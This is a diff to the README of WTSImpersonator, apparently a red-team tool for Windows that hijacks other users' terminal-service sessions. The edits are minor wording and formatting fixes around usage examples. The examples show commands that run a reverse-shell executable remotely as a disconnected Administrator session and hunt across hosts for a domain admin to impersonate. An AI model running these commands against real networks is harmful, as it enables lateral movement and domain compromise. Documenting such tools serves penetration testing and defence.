@@ -45,12 +45,14 @@ WTSEnumerateSessions count: 1
         WTSUserName:  Administrator
         WTSDomainName: LABS
         WTSConnectState: 4 (WTSDisconnected)
-
+```  
+as can be seen above the `Sessionid` of the Administrator account is `2` so we use it next in the `id` variable when executing code remotely
+```powershell
 PS C:\Users\Jon\Desktop> .\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
-```
+```  
 ##### `user-hunter` Module  
 
-The user hunter module will give you the ability to enumerate multiple machines and if a given user is found, execute code on this user behalf.  
+The user hunter module will give you the ability to enumerate multiple machines and if a given user is found, it will execute code on this user behalf.  
 this is useful when hunting for "Domain Admins" while having local administrator rights on a few machines.  
 ```powershell
 PS C:\Users\Jon\Desktop> .\WTSImpersonator.exe -m user-hunter -uh LABS/Administrator -ipl .\test.txt -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe
